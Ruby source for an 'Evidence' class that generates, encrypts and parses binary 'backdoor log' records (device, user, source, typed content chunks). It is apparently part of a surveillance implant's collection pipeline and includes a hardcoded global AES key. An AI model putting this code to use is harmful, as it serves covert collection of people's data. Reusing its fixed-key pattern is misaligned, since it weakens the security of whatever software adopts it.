#
# Evidence factory (backdoor logs)
#

# relatives
require_relative 'crypt'
require_relative 'time'
require_relative 'utf16le'
require_relative 'evidence/common'

# RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/utf16le'

# system
require 'securerandom'

Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS

class Evidence
  
  extend Crypt
  include Crypt
  include RCS::Tracer
  
  attr_reader :binary
  attr_reader :size
  attr_reader :content
  attr_reader :name
  attr_reader :timestamp
  attr_reader :info
  attr_reader :version
  attr_reader :type
  attr_writer :info

  GLOBAL_KEY = "\xab\x12\xcd\x34\xef\x56\x01\x23\x45\x67\x89\xab\xcd\xef\x00\x11"

  def self.version_id
    2008121901
  end
  
  #def clone
  #  return Evidence.new(@key, @info)
  #end
  
  def initialize(key)
    @key = key
    @version = Evidence.version_id
  end
  
  def extend_on_type(type)
    extend instance_eval "#{type.to_s.capitalize}Evidence"
  end
  
  def extend_on_typeid(id)
    extend_on_type EVIDENCE_TYPES[id]
  end
  
  def generate_header(type_id, info)
    tlow, thigh = info[:da].to_filetime
    deviceid_utf16 = info[:device_id].to_utf16le_binary
    userid_utf16 = info[:user_id].to_utf16le_binary
    sourceid_utf16 = info[:source_id].to_utf16le_binary

    add_header = ''

    if respond_to?(:additional_header)
      header = info.delete(:header)
      add_header = header ? additional_header(header) : additional_header
    end

    additional_size = add_header.bytesize
    struct = [Evidence.version_id, type_id, thigh, tlow, deviceid_utf16.bytesize, userid_utf16.bytesize, sourceid_utf16.bytesize, additional_size]
    header = struct.pack("I*")
    
    header += deviceid_utf16
    header += userid_utf16
    header += sourceid_utf16
    header += add_header.to_binary
    
    return header
  end
  
  def align_to_block_len(len)
    rest = len % 16
    len += (16 - rest % 16) unless rest == 0
    len
  end
  
  def encrypt(data)
    rest = align_to_block_len(data.bytesize) - data.bytesize
    data += "a" * rest
    return aes_encrypt(data, @key, PAD_NOPAD)
  end
  
  def decrypt(data)
    return aes_decrypt(data, @key, PAD_NOPAD)
  end
  
  def append_data(data, len = data.bytesize)
    [len].pack("I") + data
  end
  
  # factory to create a random evidence
  def generate(type, common_info)
    @name =  SecureRandom.hex(16)
    info = Hash[common_info]
    info[:da] = Time.now.utc
    info[:type] = type

    # extend class on requested type
    extend_on_type info[:type]

    # header
    type_id = EVIDENCE_TYPES.invert[type]
    header = generate_header(type_id, info)
    @binary = append_data(encrypt(header))

    # content
    if respond_to? :generate_content
      content = info.delete(:content)
      chunks = content ? generate_content(content) : generate_content
      chunks.each do | c |
        @binary += append_data( encrypt(c), c.bytesize )
      end
    end
    
    return self
  end
  
  def size
    @binary.bytesize
  end
  
  # save the file in the specified dir
  def dump_to_file(dir)
    # dump the file (using the @name) in the 'dir'
    File.open(dir + '/' + @name, "wb") do |f|
      f.write(@binary)
    end
  end
  
  # load an evidence from a file
  def load_from_file(file)
    # load the content of the file in @content
    File.open(file, "rb") do |f|
      @binary = f.read
      @name = File.basename f
    end
    
    return self
  end

  def read_uint32(data)
    data.read(4).unpack("L").shift
  end

  def empty?(binary_string, header_length)
    (binary_string.size == header_length + 4)
  end

  def deserialize(data)
    
    raise EvidenceDeserializeError.new("no content!") if data.nil?
    binary_string = StringIO.new data
    
    # header
    header_length = read_uint32(binary_string)
    
    # check if we need to apply the global key (evidence is being imported)
    if (header_length & 0x80000000) == 0x80000000
      trace :debug, "USING GLOBAL KEY FOR EVIDENCE DECODING!"
      @key = GLOBAL_KEY
      header_length &= ~0x80000000
    end
    
    # if empty evidence, raise
    raise EmptyEvidenceError.new("empty evidence") if empty?(binary_string, header_length)
    
    # decrypt header
    header_string = StringIO.new decrypt(binary_string.read header_length)
    @version = read_uint32(header_string)
    @type_id = read_uint32(header_string)
    time_h = read_uint32(header_string)
    time_l = read_uint32(header_string)
    host_size = read_uint32(header_string)
    user_size = read_uint32(header_string)
    ip_size = read_uint32(header_string)
    additional_size = read_uint32(header_string)
    
    # check that version is correct
    raise EvidenceDeserializeError.new("mismatching version [expected #{Evidence.version_id}, found #{@version}]") unless @version == Evidence.version_id

    common_info = Hash.new
    common_info[:dr] = Time.new.getgm
    common_info[:da] = Time.from_filetime(time_h, time_l).getgm

    common_info[:device] = header_string.read(host_size).utf16le_to_utf8 unless host_size == 0
    common_info[:device] ||= ''
    common_info[:user] = header_string.read(user_size).utf16le_to_utf8 unless user_size == 0
    common_info[:user] ||= ''
    common_info[:source] = header_string.read(ip_size).utf16le_to_utf8 unless ip_size == 0
    common_info[:source] ||= ''

    # extend class depending on evidence type
    begin
      common_info[:type] = EVIDENCE_TYPES[ @type_id ].to_s.downcase
      extend_on_type common_info[:type]
    rescue Exception => e
      puts e.message
      raise EvidenceDeserializeError.new("unknown type => #{@type_id.to_s(16)}, #{e.message}")
    end

    additional_data = header_string.read additional_size if additional_size > 0

    yield additional_data if block_given?

    # split content to chunks
    chunks = Array.new
    if common_info[:type] == 'command'
      chunks << [binary_string.read]
    else
      until binary_string.eof?
        len = read_uint32(binary_string)
        content = binary_string.read align_to_block_len(len)

        decoded_chunk = nil

        begin
          decoded_chunk = StringIO.new(decrypt(content)).read(len)
        rescue Exception => ex
          yield(chunks.join) if block_given?
          raise EvidenceDeserializeError.new("Unable to decrypt chunck #{chunks.size}. Expected length is #{len}, content bytesize is #{content.bytesize}. #{ex.message}")
        end

        chunks << decoded_chunk
      end
    end

    yield chunks.join if block_given?

    # decode additional header
    if respond_to? :decode_additional_header and additional_size != 0
      additional_info = decode_additional_header(additional_data)
      common_info.merge!(additional_info)
    end

    # decode evidence body
    evidences = Array.new
    action = decode_content(common_info, chunks) {|ev| evidences << ev}

    return evidences, action
  end
end

end # RCS::
